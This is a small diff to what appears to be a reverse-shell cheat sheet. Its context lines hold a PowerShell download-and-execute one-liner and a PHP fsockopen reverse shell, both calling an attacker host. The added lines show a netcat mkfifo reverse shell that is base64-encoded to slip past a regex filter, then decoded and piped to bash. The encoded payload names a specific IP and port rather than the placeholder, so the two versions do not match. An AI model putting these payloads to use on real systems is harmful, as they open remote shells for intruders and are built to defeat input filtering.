@@ -599,4 +599,13 @@ PowerShell "IEX(New-Object Net.WebClient).downloadString('http://IP_ATTACK/rev.p
 php -r '$sock=fsockopen("IP_ATTACK",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
+- Also, if the php script has a regex, you can encode to base64 a netcat shell like:
+
+```shell
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_ATTACK PORT >/tmp/f" | base64
+
+#Then pipe it
+cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTQuNjkuMSA2NjYgPi90bXAvZgo | base64 -d | bash
+```
+
 ---
